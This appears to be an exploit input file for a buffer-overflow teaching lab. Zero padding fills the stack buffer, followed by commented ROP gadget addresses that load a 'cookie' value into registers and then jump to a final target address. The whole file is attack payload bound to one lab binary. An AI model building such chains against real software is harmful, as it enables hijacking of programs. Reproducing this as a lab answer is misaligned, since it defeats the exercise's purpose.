00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
43 18 40 00 00 00 00 00 /* pop rcx */
80 93 14 63 00 00 00 00 /* cookie */
29 18 40 00 00 00 00 00 /* rcx to rax */
35 18 40 00 00 00 00 00 /* rax to rdi */
03 18 40 00 00 00 00 00 /* rdi to rdx */
1d 18 40 00 00 00 00 00 /* rdx to rsi */
43 18 40 00 00 00 00 00 /* pop rcx */
01 00 00 00 00 00 00 00 /* 1 */
08 18 40 00 00 00 00 00 /* rcx + rsi */
46 15 40 00 00 00 00 00
